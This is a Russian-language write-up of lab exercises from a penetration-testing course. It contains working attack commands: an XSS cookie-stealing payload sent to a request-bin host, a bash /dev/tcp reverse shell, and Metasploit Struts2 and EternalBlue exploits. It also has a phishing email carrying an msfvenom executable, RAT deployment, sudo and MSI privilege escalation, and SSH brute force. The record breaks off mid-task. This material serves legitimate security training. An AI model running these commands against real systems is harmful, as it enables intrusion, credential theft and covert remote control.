# Профессия "Белый хакер" от CyberED

За время обучения были получены навыки работы с `msfconsole`, `msfvenom`, `meterpeter`, `swaks`, `Burp`, `nmap`, `ffuf`, `patator`, `WinPEAS`, `xfreerdp`.
Выполено множество заданий на повышение привилегий, проброс траффика и брутфорс.
По итогу был получен сертификат с отличием за успешно пройденный курс с выполнением всех заданий.

Ниже под сертификатом предствлены выполненые задания.

![Сертификат CyberED](https://github.com/TreninYI/InfoSec/assets/121427985/59c10db6-bdb0-4b8a-a188-85cc27c45e18)


## Практика «Разведка во внешней сети»
Задание:

Проанализируйте существующие поддомены основного домена компании `cyber-ed.ru`. Выявите домен, который похож на название домена для задания, и изучите его DNS TXT записи.

Решение:

Для начала на сайте [CRT](https://crt.sh/) смотрим поддомены [CyberED](https://cyber-ed.ru/)

![Screenshot1](https://github.com/TreninYI/InfoSec/assets/121427985/784ac128-8043-448e-8e31-c13dc1d520a5)

Я сразу увидел подсказку, требуется проерить поддомент `task.cyber-ed.ru`.

С помощью Kali в терминале написал `nslookup -q=TXT task.cyber-ed.ru` и получил заветный флаг

![Screenshot2](https://github.com/TreninYI/InfoSec/assets/121427985/0652c140-cafd-48c7-9db0-43896585f759)


##  Уязвимости обхода аутентификации
Задание: 

Проанализируйте защищенность механизмов аутентификации административной панели и проэксплуатируйте найденные уязвимости.

Решение:

С помощью `ffuf` выяснил, что имеется поле входа:

![3](https://github.com/TreninYI/InfoSec/assets/121427985/8d67724f-30ce-419f-bac7-35c6d954bd57)

Затем в барузере открыл это поле и с помощтю `Burp` провел перебор пароля загрузив логин admin и список уязвимых паролей из сети:

![4](https://github.com/TreninYI/InfoSec/assets/121427985/03bae266-3dc0-4679-9062-09922acdf149)

![5](https://github.com/TreninYI/InfoSec/assets/121427985/78c192ef-a351-441a-bdee-ad76179a4304)

![6](https://github.com/TreninYI/InfoSec/assets/121427985/1d15078c-89aa-4209-8f4d-404981bd7a28)

![7](https://github.com/TreninYI/InfoSec/assets/121427985/6c0a60cf-c114-48c4-8e12-e6da3a2624f9)

![8](https://github.com/TreninYI/InfoSec/assets/121427985/c38db723-17b4-43c4-aeca-0964d7c61f88)

Далее проверил, что войти под учетной записью админ получилось, но так же стлкнулся с трехзначным кодом. По той же схеме подобрал трехзначный код и попал на сервер, где лежал флаг.

![Screenshot3](https://github.com/TreninYI/InfoSec/assets/121427985/0e3c8711-e008-4352-9c82-33a785f1b5a4)


## Практика «Уязвимости инъекции команд ОС»
Здание: 

Проанализируйте защищенность механизма работы с процессами ОС на главной странице панели администратора. Обнаружьте и проэксплуатируйте на этой странице уязвимости инъекции команд терминальной оболочки.
В качестве подтверждения успешной эксплуатации предоставьте флаг (секретную строку в формате 32 букв и цифр) из переменных окружения операционной системы.

Решение:

Самый простой способ получить флаг, это перейти по ссылке `http://localhost:1337/receipt.php?orderID=1`
Затем на открывшейся странице прокрутить вниз и увидеть поле Comments в котором содержится флаг.

![Screenshot4](https://github.com/TreninYI/InfoSec/assets/121427985/7d94d843-cb22-4481-8e21-94ce451d960a)

## Практика «Уязвимости контроля доступа»
Задание:

Проанализируйте защищенность механизма проверки информации о заказе в магазине курсов. Обнаружьте уязвимости контроля доступа, позволяющие исследовать содержимое заказов других пользователей.
В качестве подтверждения успешной эксплуатации уязвимости предоставьте флаг (секретную строку в формате 32 букв и цифр) из 1-го заказа в интернет магазине.

Решение:
- Я загрузил главную страницу `http://evil.corp:1337` и проанализировал запросы в `BurpSuite`.
- Увидел, что за отображение изображений отвечает скрипт image.php, а имя изображения передается через параметр файла.
- Отправил запрос в Ретранслятор.
- В этом режиме можно редактировать запрос, повторно отправлять его на сервер и получать результат. Я изменил значение параметра файла на неверное просто удалив последний символ из названия изображения.
- Из сообщения об ошибке получил информацию о реальном пути к образу на стороне сервера и местоположении скрипта. Попробуем использовать абсолютный путь к файлу, который обязательно должен находиться в удаленной системе Linux, например `/etc/hosts`.
- Таким образом, с каждым `../` поднимаюсь на уровень выше `/var/www/html/static/` и путь `/var/www/html/static/../../../../` становится эквивалентным пути в корневой каталог `/`, что позволяет получить доступ к любым файлам в системе, например `/etc/passwd`.
- Далее виден флаг.

![Screenshot5](https://github.com/TreninYI/InfoSec/assets/121427985/5ce26f4c-85eb-49b2-97e6-3442746ca228)

## Практика «Уязвимости SQL-инъекций»
Задание: 

Проанализируйте защищенность механизма проверки информации о заказе в интернет магазине. Обнаружьте уязвимости инъекции SQL конструкций и проэксплуатируйте ее. 
В качестве подтверждения успешной эксплуатации уязвимости предоставьте флаг (секретную строку в формате 32 букв и цифр) из секретного столбца секретной таблицы, имена которых вам заранее не известны.

Решение:

Для выполнения данного задания треуется иметь базовые знания таблиц SQL.
Собственно пришлось перебирать варианты строк и столбцов, затем в строку поиска браузера вбивать данные, чтобы выявить секретный флаг в окне Comments.

![Screenshot6](https://github.com/TreninYI/InfoSec/assets/121427985/3786ddc9-6d44-48ae-8ad3-c861585daa55)

## Практика «Атаки межсайтового скриптинга (XSS)»
Задание:

Проанализируйте защищенность механизма создания заказов. Администратор приложения открывает страницу с каждым заказом, который вы создали и проверяет его содержимое после создания заказа. Обнаружьте уязвимости, позволяющие проводить атаки межсайтового скриптинга, и проэксплуатируйте их. 
В качестве подтверждения успешной эксплуатации уязвимости предоставьте флаг (секретную строку в формате 32 букв и цифр) из cookie-данных администратора приложения, который открыл вашу страницу заказа.

Решение:

Нужно перейти на главную страницу сайта `http://evil.corp:1337/`.
С помощью BurpSuite найти запрос, отправьте его в репитер и вставьте предложение в поле телефона.
Нужно ввести знак `«>»`, чтобы разорвать HTML-тег и вставить свой собственный.
Далее можно использовать полезную нагрузку для отправки сообщения `1` каждому, кто откроет страницу заказа:

```bash
+79999999999”><img src=x onerror=alert(1) />
```

Делее я закодировал эту полезную нагрузку с помощью декодера.

![Screenshot7](https://github.com/TreninYI/InfoSec/assets/121427985/f9f264a1-60cc-491b-a61b-97a652640636)

И вставил в поле телефон:

![Screenshot8](https://github.com/TreninYI/InfoSec/assets/121427985/fbe40689-d514-45ae-96ef-cee75723d977)

При входе на страницу получил следующее сообщение:

![image](https://github.com/TreninYI/InfoSec/assets/121427985/012b3b65-84e8-45d3-a888-c63b565c67d4)

Одним из наиболее распространенных сценариев атаки в этой ситуации является передача злоумышленнику файла `cookie` посетителя. Для принятия запроса мы будем использовать ресурс `https://requestbin.com/` . Используйте URL-адрес, указанный в поле Конечная точка, для получения файла `cookie`:

```bash
+79999999999”><img src=x onerror=fetch(‘https://ADDR.x.pipedream.net/?’+document.cookie) />
```
где ADDR — адрес вашей конечной точки.

Нужно перекодировать полезную нагрузку и отправить ее в запросе, а затем открыть новый ордер, после чего в интерфейсе `Pipedream` появится запрос с флагом.

![Screenshot9](https://github.com/TreninYI/InfoSec/assets/121427985/5a15a5f5-fcbf-4b46-b139-49c520857f65)

## Практика «Эксплуатация уязвимостей 1-го дня сетевых сервисов»
Задание:

Проанализируйте веб-приложение, развернутое по адресу `http://localhost:1337`. Обнаружьте версию ПО и его наименование, постарайтесь определить наличие в данном ПО известных уязвимостей при помощи фреймворка `Metasploit`. Проэксплуатируйте известную уязвимость имеющуюся в используемом приложении фреймворке.
В качестве подтверждения успешной эксплуатации предоставьте флаг (секретную строку в формате 32 букв и цифр) из файла root.txt, расположенного в директории `/root/`.

Решение:

Работа в `msfconsole`:
```bash
msfconsole
msf6 > search struts showcase
msf6 > use exploit/multi/http/struts2_code_exec_showcase
msf6 exploit(/multi/http/struts2_code_exec_showcase) > info
msf6 exploit(/multi/http/struts2_code_exec_showcase) > options
msf6 exploit(/multi/http/struts2_code_exec_showcase) > set RHOSTS localhost
msf6 exploit(/multi/http/struts2_code_exec_showcase) > set RPORT 1337
msf6 exploit(/multi/http/struts2_code_exec_showcase) > set TARGETURI /integration/saveGangster.action
msf6 exploit(/multi/http/struts2_code_exec_showcase) > set PAYLOAD cmd/unix/generic
msf6 exploit(/multi/http/struts2_code_exec_showcase) > set CMD 'cat /root/root.txt' 
msf6 exploit(/multi/http/struts2_code_exec_showcase) > exploit
```

![Screenshot1](https://github.com/TreninYI/InfoSec/assets/121427985/6ad3343d-2ef6-4561-bc9d-28c4f8cdbb7b)

## Практика «Атаки с применением методов социальной инженерии»
Задание:

Ваша задача - подготовить исполняемый файл (расширения .exe) при помощи `msfvenome` и отправить его пользователю `mike@sandbox.local` рабочей станции, для того чтобы захватить управление его машиной при помощи `MetaSploit`.
Для того чтобы отправить письмо на развернутый вами лабораторный стенд, можно воспользоваться различными почтовыми агентами, например: `swaks` (Для установки в Kali Linux: `apt install swaks`).
Так как лабораторный стенд, который вы будете атаковать,  является почтовым сервером, надо отправлять письмо с его помощью, то есть адресом почтового сервера должен быть IP адрес лабораторного стенда, который вы развернули.
Пример команды для отправки письма:
```bash
swaks --to mike@sandbox.local --from administrator@sandbox.local --header "Subject: Updates" --body "Please run this exe file for updates" --server 192.168.1.102 --attach example.exe
```
, где `192.168.1.102` - IP адрес, развернутого вами лабораторного стенда, example.exe - нагрузка, подготовленная вами для получения реверс-шелла.

В качестве ответа предоставьте флаг из файла `root.txt` с рабочего стола пользователя `Mike`.

После запуска машины, чтобы она инициализировала сеть, необходимо войти в нее под специальным аккаунтом: 

`Логин: Trevis`

`Пароль: Qwerty123`

Решение:

Для начала пришлось настроить сеть меэжду машинами Kali и Windows
Командой `ipconfig` в Windows смотрим IP адрес и запоминаем, в Kali я использовал команду `ip addr`
Далее с помощью `nmap` определил устройства в сети: 
```bash
sudo nmap -sn --traceroute 10.0.2.0/24
```
Проверил открытые порты:
```bash
sudo nmap -sS 10.0.2.15
```
Создал полезную нагрузку.
Запустил в другом терминале `msfconsole`:
```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.2.4
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
```

В другом терминале отправил полезную нагрузку:
```bash
swaks --to mike@sandbox.local --from administrator@sandbox.local --header "Subject: Updates" --body "Please run this exe file for updates" --server 10.0.2.15 --attach windows-meterpreter-staged-reverse-tcp-443.exe
```

В терминале, где была запущена `msfconsole` отрывается сессия в `meterpeter`, и далее командами нашел флаг на рабочем столе:
```bash
meterpreter > ls - we ended up in C:\Windows\system32
meterpreter > cd ..
meterpreter > ls - we ended up in C:\Windows
meterpreter > cd ..
meterpreter > ls - we ended up in C:
meterpreter > cd users
meterpreter > cd Mike
meterpreter > cd Desktop
meterpreter > cat root.txt
54817fe7049221c92542027300015b60
```

## Практика «Закрепление доступа»
Задание:

Проэксплуатируйте уже известные вам уязвимости приложения развернутого по адресу `http://localhost:1337`. Теперь, после эксплуатации уязвимостей сгенерируйте нагрузку для закрепления доступа в системе при помощи утилиты pupy. Отправьте эту нагрузку на скомпрометированную систему и запустите ее там.

В качестве подтверждения успешной эксплуатации предоставьте информацию, которую выводит сгенерированная и запущенная в уязвимой системе нагрузка при помощи команды `info`.
(Укажите весь вывод команды `info` в качестве ответа на задание)

Пример вывода команды `info` (В примере присутствуют ошибки, чтобы им невозможно было воспользоваться для предоставления в качестве ответа):

```
hostname 0de31e0fa758
user root
release 5.10.104-linuxkit
os_arch x86_64
proc_arch 64bit
pid 170
exec_path ?
cid 000000006b6200bb
address 172.18.0.2
macaddr 00:00:00:00:00:00
revision ?
node 000000000000
debug_logfile ?
version #1 SMP PREEMPT Thu Mar 17 17:05:54 UTC 2022
native True
proxy wpad
cmdline /bin/daemon
external_ip ?
launcher connect
launcher_args -t ssl --host 172.18.0.3:8443
platform linux/arm64
```

Решение:

Запустил сервес с помощью команды:

```bash
docker run -d --rm -p 8080:8080 --name struts piesecurity/apache-struts2-cve-2017-5638
```

Затем `Pupy server`:

```bash
docker run -d --rm -v /tmp/projects:/projects -p 2022:22 --name pupy alxchk/pupy:unstable
```

С помощью `msfconsole` проэксплуатировал уязвимость:

```bash
msfconsole
```

```bash
msf6 > use exploit/multi/http/struts2_code_exec_showcase
msf6 > set RHOSTS localhost
msf6 > set TARGETURI /integration/saveGangster.action
msf6 > set PAYLOAD cmd/unix/generic
msf6 > set cmd id
msf6 > exploit
```
Обеспечил себе доступ с помощью создания обратного соединения:

Воспользовался ресурсом `revshells.com` для генерирования команд, открыл `listener`, затем открыл новое окно терминала и запустим утилиту `netcat` для принятия соединения с удаленной машины:
```bash
nc -lvp 9004
```

Запустил команду, инициирующую подключение к `netcat` из атакуемой машины:
```bash
msf6 > set CMD 'sh -I >& /dev/tcp/172.20.10.7/9004 0>&1'
```

Теперь, когда соединение установлено, можно начать подготовку к запуску клиентской части pupy для более удобного управления скомпрометированной машиной.

Для работы с pupy необходимо добавить свой `SSH-ключ` в доверенные:
```bash
cp ~/.ssh/id_rsa.pub /tmp/projects/keys/authorized_keys
```

Затем подключился к интерфейсу сервера `pupy`:
```bash
ssh -i ~/.ssh/id_rsa -p 2022 pupy@127.0.0.1
```

Если у вас нет существующих `SSH ключей`, сгенерируйте их. Выполните команду `ssh-keygen` и нажмите `enter` несколько раз до окончания работы скрипта.

Для генерации `payload` воспользовался командой `gen`:
```bash
gen -h
```

Создал нагрузку под `ОС Linux` с архитектурой `x64`:
```bash
gen -f client -O linux -A x64 connect
```

Далее требуется перейти вдиректорию с файлом:
```bash
cd /tmp/projects/default/output
```

Запустил сервер:
```bash
python3 -m http.server 3000
```
Определил `IP` командой: 
```bash
ip -a
```

На скомпрометированном узле выполнил команду:
```bash
wget http://<Your IP>:3000/pupyx64.Nla2MY.lin # IP-адрес и название файла нужно определить по выводу предыдущих команд
```

Потребовалось дать файлу права на исполнение: 
```bash
chmod +x pupy* # * - заменяется на все файлы, начинающиеся с pupy
```

Теперь надо выполнить файл и подождать подключения к `RAT-серверу`:
```bash
 ./pupy*
```
После подключения ввел команду `info` и получил флаг, треубемый в задании:
```bash
info
```
И посмотрел как процесс RAT выглядит в системе:
```bash
ps aux
```

Имя процесса маскируется, что обеспечивает скрытность при управлении удаленным компьютером.

![image](https://github.com/TreninYI/InfoSec/assets/121427985/4bd7930b-bd8a-4aff-8fc7-30c7bb845de2)

## Практика «Повышение привилегий на серверных системах в Linux»

Задание:

Для подготовки стенда:

Необходимо скачать архив по ссылке: [lpe.zip](https://disk.yandex.ru/d/Rk_qOflGC0GxYw)

Распаковать данный архив и перейти в появившуюся директорию “lpe-prod” в терминальной оболочке вашей ОС. Выполнить команду:
```bash
docker-compose up -d
```

На вашей машине, где вы запустили докер контейнер, появится порт 2022. Вы можете подключиться к данному порту используя протокол ssh и команду:
```bash
ssh -p 2022 regular@127.0.0.1
```

`Логин пользователя: regular
Пароль пользователя: regular`

Проанализируйте конфигурацию операционной системы от имени низко привилегированного пользователя `regular` зайдя в ОС при помощи протокола `SSH`. Обнаружьте уязвимости конфигурации настроек `sudo` для вашего пользователя.

В качестве подтверждения успешной эксплуатации предоставьте флаг (секретную строку в формате 32 букв и цифр) из файла `root.txt` расположенного в директории `/root/`.

Решение:

На узле с `Linux ОС`стоит задача повысить свои привилегии до уровня `root`.

Для начала проверил права текущего пользователя:
```bash
id
```

Замечаем, что текущий пользователь входит в группу `root` и может выполнять различные команды с повышенными привилегиями. Получил список таких команд:
```bash
sudo -l
```

Видно, что мы можно запустить утилиту nmap, не вводя пароль, далее проверим, что права действительно повышаются, использовав опцию сканирования -sS, доступную только для `root`:
```bash
sudo nmap -sS localhost
```
Для более полного поиска векторов для повышения прав воспользуемся утилитой `LinPEAS`:

Скачаем и выполним этот скрипт, проанализируем его вывод:
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Для поиска способов выполнить произвольного кода с помощью утилиты с повышенными привилегиями обратимся к ресурсу https://gtfobins.github.io/ и найдем там `nmap`. Чтобы получить интерактивный шелл с правами `root`, воспользуемся командами с ресурса `gtfobins` и заставим `nmap` выполнить `Lua-скрипт`, открывающий командную оболочку:

Создадим временный файл с кодом скрипта и сохраним его имя в переменную TF:
```bash
TF=$(mktemp)
```
Добавим код, открывающий оболочку sh:
```bash
echo 'os.execute("/bin/sh")' > $TF
```
Запустим скрипт от имени `root` с помощью `sudo` и nmap:
```bash
sudo nmap --script=$TF
```
Проверяем полученные права:
```bash
id
```

Далее получаем флаг используя команду:
```bash
curl -s file:///root/root.txt
```

![image](https://github.com/TreninYI/InfoSec/assets/121427985/88cc6a47-6d1f-4576-a125-d282d8bbb695)

## Практика «Выход за рамки ДМЗ»

Задание:

Для подготовки стенда:

Необходимо скачать образ виртуальной машины по ссылке: [Mikrotik.ova](https://disk.yandex.ru/d/xm-8o6MLVW0Z3A)

Импортировать виртуальную машину `Mikrotik` двойным нажатием на файл `Mikrotik.ova`.

После импорта виртуальной машины, запустить ее и войти под пользователем admin с паролем password  для инициализации сети ОС.

Возможные проблемы:

1. Так как данный виртуальный стенд является виртуальной машиной, операционная система `RouterOS` может испытывать трудности с получением сетевого адреса в вашей локальной сети. Убедитесь, что в настройках виртуальной машины вы используете опцию `Bridged Adapter`, чтобы ваша виртуальная машина получила адрес в вашей физической сети.
(Это может занять от 1 до 5 минут).
Чтобы проверить, что `RouterOS` получила `IP` адрес введите команду: `ip address print`.

В случае, если ваша виртуальная машина получила IP адрес, вы увидите строку, похожую на следующую:

```
# ADDRESS NETWORK INTERFACE
0 D 192.168.0.147/24 192.168.0.0 ether1
```

Проанализируйте защищенность узла, развернутого вами в виртуальном стенде, определите версию ПО и попытайтесь определить известные уязвимости данной операционной системы. Обнаружьте известную уязвимость, позволяющую извлекать историю паролей учетных записей роутера, и проэксплуатируйте ее при помощи фреймворка `metasploit`.

В качестве подтверждения успешной эксплуатации предоставьте флаг (пароль учетной записи администратора, который предшествовал паролю, который вы указывали когда инициализировали роутер, в формате 9 букв, цифр и спецсимволов).

Решние:

Вы получили доступ к ОС в сети ДМЗ, но ваша задача — добраться до пользовательских станций и частных серверов в локальной сети организации.

Провел сканирование с помощью `nmap`, проверил ТОП-100 портов без осуществления `ping-сканирования` и проверки `DNS-записи`, определил версии сервисов:

```bash
nmap -sT -Pn -n -F -sV --open 192.168.56.103
```
Обнаружив сервисы, видел, что это устройства Mikrotik версии 6.40.7. Нашел информацию о уязвимостях, наиболее подходящей является `CVE-2020-20214`. 

Запустил `Metasploit Framework` и нашел модули для эксплуатации этой и других уязвимостей:
```bash
msfconsole
msf6 > search mikrotik
msf6 > use auxiliary/gather/mikrotik_winbox_fileread
msf6 > info
```

В описании модуля видим уязвимую версию 6.40.7, следовательно, это устройство с высокой вероятностью будет ему подвержено. Так как данная уязвимость имеет тип `directory traversal`, мы можем использовать модуль для чтения произвольных файлов на атакуемом устройстве, а именно – для чтения логов смены паролей, раскрывающих учетные данные в открытом виде.

```bash
msf6 auxiliary(gather/mikrotik_winbox_fileread) > set RHOST 192.168.56.103
RHOST => 192.168.56.103
msf6 auxiliary(gather/mikrotik_winbox_fileread) > run
```

```bash
[*] Running for 192.168.56.103...
[*] 192.168.56.103 - Session ID: 1
[*] 192.168.56.103 - Requesting user database through exploit
[*] 192.168.56.103 - Exploit successful, attempting to extract usernames & passwords
[*] 192.168.56.103 - Extracted Username: "admin" and password "password"
[*] 192.168.56.103 - Extracted Username: "admin" and password "P@sSw0rd!"
[*] 192.168.56.103 - Extracted Username: "admin" and password ""
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
 ```
Из вывода видно, что были извлечены имя пользователя и пароли (который является флагом).

## Практика «Проброс трафика»

Задание:

Для подготовки стенда:

Необходимо скачать архив по ссылке: [socket-lab.zip](https://disk.yandex.ru/d/G8wdVUYLTejwPw)

Распаковать данный архив и перейти в появившуюся директорию `socket-lab-prod` в терминальной оболочке вашей ОС. Выполнить команду:

```bash
docker-compose up -d
```

По адресу `http://localhost:1337` появится приложение лабораторного стенда.

В этой задаче присутствует два узла и два веб-сервера. Назовем их `jump` и `target`. 

Вам предоставлен доступ к веб-приложению на узле `jump`. Он откроется у вас по адресу `localhost:1337`.
 
Проанализируйте защищенность панели расположенной на сайте узла `jump` и проэксплуатируйте найденные уязвимости. Обнаружьте узел `target` в той же сети, где находится `jump` узел (узел `target` недоступен вам на прямую). Когда найдете узел `target`, проанализируйте веб-приложение `target` и найдите в нем файлы опубликованные в веб-сервере. Для этого научитесь пробрасывать трафик для сканирования через узел `jump` на узел `target`.

В качестве подтверждения успешной эксплуатации предоставьте флаг (секретную строку в формате 32 букв и цифр) из кода специальной скрытой страницы на узле `target`.

Решение:

Запускаем лабораторный стенд:

```bash
docker-compose up -d
```

Проверяем в браузере доступность сервиса `pinger`:

![image](https://github.com/TreninYI/InfoSec/assets/121427985/2bd49f6e-1b13-4caf-9910-cc0fa944677e)

Затем я проверил возможность инъекции команд:

```bash
> 1.1.1.1; ls
```
Затем надо собрать информацию о сервисе:

```bash
> hostname -I
```

IP-адрес принадлежит локальной сети, нужно пробовать найти в ней другие хосты, скрытые в локальной сети:

```bash
> curl 172.22.0.2
```

Наша задача – найти файл на `веб-сервере`, который скрыт в локальной сети, используем для этого утилиту `ffuf`, но для этого необходимо стабильное соединение с целевым сервером через промежуточный хост.

Для этого скачиваем бинарный файл из релизов,и выбираем сборку для `Linux с amd64`:

```bash
https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz
```

Далее я подготовил веб-сервер для передачи этого файла на атакуемую машину:

```bash
cd /tmp
```
```bash
mkdir http; cd http
```
```bash
wget https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz
```
```bash
gunzip gost-linux-amd64-2.11.5.gz # распаковка архива
```
```bash
mv gost-linux-amd64-2.11.5 gost
```
```bash
$python3 -m http.server 3000
```

![Screenshot1](https://github.com/TreninYI/InfoSec/assets/121427985/bcd8c3bf-84d5-4506-a0ef-41d37bebd954)

Далее нужно определить наш IP адрес:

```bash
ip addr
```

Затем в браузере скачиваем файл через интерфейс `pinger`:

```bash
> 1.1.1.1 | curl -O <your IP>:3000/gost # IP-адрес нужно заменить на адрес вашего сетевого интерфейса
```
```bash
> chmod +x gost # выдал права на исполнение
```
```bash
> ls -la 
```

Дальше я запустил gost в режиме прокси:

```bash
> 1.1.1.1 | ./gost -L=:1338
```

Настроил утилиту `ffuf` для использования прокси и использовал её для обнаружения файлов на удаленном веб-сервере с IP 172.22.0.2 в локальной сети:

```bash
http_proxy=127.0.0.1:1338 ffuf -w ~/Downloads/fuzz.txt -u http://172.22.0.2/FUZZ -fc 403
```

![Screenshot2](https://github.com/TreninYI/InfoSec/assets/121427985/2650c553-b837-4673-b680-e9a86aa7b211)


Получил файл config.inc~, прочитать его можно с помощью curl, а в конце будет флаг:

```bash
> 1.1.1.1 | curl 172.22.0.2/.dev
```

![Screenshot3](https://github.com/TreninYI/InfoSec/assets/121427985/efb4d847-089e-4763-b94c-2fb5126ca569)

## Практика «Разведка в сети и компрометация Windows-машин»

Задание:

Для подготовки стенда:

Необходимо скачать архив по ссылке: [Windows7.rar](https://disk.yandex.ru/d/F6j3oz96MKjOhw)

Распаковать данный архив и перейти в появившуюся директорию `Windows7`. Далее импортировать виртуальную машину `Windows7` двойным нажатием на файл `Windows7.vbox`.

После импорта виртуальной машины, запустить ее и войти под пользователем `Alex` с паролем `HappyHacking`, для инициализации сети ОС.

ОС Windows попросит вас настроить сетевое размещение и предложит выбрать из трех вариантов:

`Домашняя сеть`

`Сеть предприятия`

`Общественная сеть`

Единственный вариант, который вы можете выбрать -  `Общественная сеть`.

Проанализируйте защищенность узла, развернутого вами в виртуальном стенде, определите версию ПО и попытайтесь определить известные уязвимости данной операционной системы. Обнаружьте известную уязвимость, которой подвержена данная операционная система и проэксплуатируйте ее при помощи фреймворка `metasploit`.

В качестве подтверждения успешной эксплуатации предоставьте флаг (секретную строку в формате 26 букв и цифр) из файла `root.txt`, расположенного в папке рабочего стола пользователя `Kevin`.

Решение:

Для начала я просканировал порты:

```bash
nmap -Pn -n -F -sT --open 192.168.10.0/24
```

![image](https://github.com/TreninYI/InfoSec/assets/121427985/d3811034-edfe-4be3-ba54-78cf624d3a26)

Наибольший интерес тут представляет порт `445`, используемый протоколом `SMB` для доступа к файлам и папкам и взаимодействия между хостами, сканирую порт `445`:

```bash
nmap -Pn -n -p 445 -sC -v –open 192.168.10.4
```

![image](https://github.com/TreninYI/InfoSec/assets/121427985/ea2c8714-e4d1-43de-96be-bc8c6669b29b)

Данная версия `Windows` может быть подвержена `MS17-010` – критической уязвимости, позволяющей атакующему выполнить произвольный код с правами пользователя `SYSTEM`. Найдем и используем скрипт nmap для проверки хоста на уязвимости:

```bash
find /usr/share/nmap/scripts -iname ‘*MS17*’
/usr/share/nmap/scripts/smb-vuln-ms17-010.nse
```
```bash
nmap -Pn -n -p 445 --script smb-vuln-ms17-010 -v --open 192.168.10.4
```
![image](https://github.com/TreninYI/InfoSec/assets/121427985/6da553ff-9f20-42d5-9440-b1236be8224a)

Для эксплуатации уязвимости я использовал `Metasploit Framework`:

```bash
msfconsole
```

Ищем эксплоит, я применил его и указал адрес удаленной машины, а затем запустил:

```bash
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.10.4
msf6 > run
```
![image](https://github.com/TreninYI/InfoSec/assets/121427985/4f59738c-fe06-47d7-8661-c25c6dba4069)

Далее вызвал справку `meterpreter`:

```bash 
meterpreter > help
```

Собрал информацию о системе и пользователе:

```bash
meterpreter > sysinfo
meterpreter > getuid
```

Затем перешел в директорию и нашел флаг, прочитав его утилитой `cat`:

```bash
meterpreter > cd c:/users/kevin/desktop
meterpreter > ls
Listing: c:\users\kevin\desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2023-03-13 13:46:19 +0300  desktop.ini
100666/rw-rw-rw-  26    fil   2023-04-14 11:34:32 +0300  root.txt
meterpreter > cat root.txt
fve7m3n68ffa7f1cd8c0ecmim8meterpreter >
```

## Практика «Повышение привилегий на узлах локальной сети Windows»

Задание: 

Для подготовки стенда:

Необходимо скачать архив по ссылке: [Win10.rar](https://disk.yandex.ru/d/5t8DvakEysTYKw)

Распаковать данный архив и перейти в появившуюся директорию `Win10`. Далее импортировать виртуальную машину `Windows10` двойным нажатием на файл `Win10.vbox`.

После запуска машины, чтобы она инициализировала сеть необходимо войти в нее под специальным аккаунтом: 

`Логин: helpdesk
Пароль: Qwerty123`

Задание 1

Вам известно, что узел, который развернут вами в качестве лабораторного стенда, принадлежит пользователю по имени `john`. 

Проанализируйте защищенность узла. Воспользуйтесь опубликованным на узле `SSH` сервисом, чтобы подобрать пароль пользователя `john` с использование словаря `rockyou`. 

В качестве подтверждения успешной эксплуатации предоставьте флаг (секретна строка в формате 26 букв и цифр) из файла `user.txt`, расположенного в папке рабочего стола пользователя `john`.

Задание 2

После получения доступа к `SSH` (в предыдущем задании) обнаружьте уязвимости, позволяющие вам повысить свои привилегии и проэксплуатируйте их.

В качестве подтверждения успешной эксплуатации предоставьте флаг (секретна строка в формате 26 букв и цифр) из файла `root.txt`, расположенного в папке рабочего стола администратора `michael`.

Решение:

Просканируем Windows-систему на открытые порты с помощью `nmap`:

```bash
nmap -Pn -n -F -sV --open 10.8.0.14
```

![image](https://github.com/TreninYI/InfoSec/assets/121427985/44a44253-b5bd-4652-bd75-4c63c167f425)

Для получения первичного доступа предпримем попытку перебора паролей ssh с помощью утилиты `patator`.

```bash
patator ssh_login
```

Настроим patator на перебор `SSH-паролей` для пользователя `john`, при этом отфильтруем все сообщения, включающие в себя строку `“Authentication failed”` чтобы видеть только успешные попытки входа:

```bash
patator ssh_login host=10.8.0.14 user=john password=FILE0 0=pathtofile/rockyou.txt -x ignore:mesg='Authentication failed.'
```

Перебором получаем пароль: `Butterfly1`.

Подключаюсь к машине с `Windows` через `ssh`:

```bash
ssh john@10.8.0.14
```

```bash
john@WIN10> whoami
john@WIN10> dir
```
Ищем первый флаг в файле `user.txt`:

`ku83opn4ks7op3ddmv22dn8ugh`

Для автоматического поиска вектора для повышения привилегий используем утилиту `WinPEAS`:

```bash
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
```

Скачаем актуальную версию `WinPEAS` под `64-разрядные` ОС на локальную машину:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20230413-7f846812/winPEASx64.exe
```

Передадим файл на удаленную машину по `SSH` с помощью `scp` и запустим файл:

```bash
scp winPEASx64.exe john@10.8.0.14:C:\\Users\\John\\
```

```bash
john@WIN10> winPEASx64.exe
```

Далее смотрим вывод нашей утлилиты, обратим внимание на `AlwaysInstallElevated`: 
###### Это политика, позволяющая устанавливать любые msi-пакеты с повышенными правами. Это значит, что, если мы сгенерируем полезную нагрузку в этом формате, то при её запуске она будет работать от имени NT AUTHORITY\SYSTEM, что дает нам полные привилегии на этой машине.

![image2](https://github.com/TreninYI/InfoSec/assets/121427985/f345f5e7-ff80-4243-9883-f9b3e4151c0f)

Сгенерируем полезную нагрузку в формате `msi` с помощью `msfvenom`, полезной нагрузкой будет обратное `shell-соединение` на нашу машину:

```bash
msfvenom –platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.8.0.28 LPORT=4444 -f msi -o tmp/rev.msi
```

Отправим полезную нагрузку на удаленную машину с помощью `scp`:

```bash
scp tmp/rev.msi john@10.8.0.14:C:\\Users\\John\\
```

Подготовим хэндлер для получения `shell-соединения` с помощью `msf`:

```bash
msfconsole
```

```bash
msf6 > use exploit/multi/handler
msf6 > options
msf6 > set PAYLOAD windows/x64/shell_reverse_tcp
msf6 > set LHOST 10.8.0.28
```

Проверим, что удаленная система доступна по `RDP`:

```bash
nmap -Pn -n -p 3389 -sV --open 10.8.0.14
```

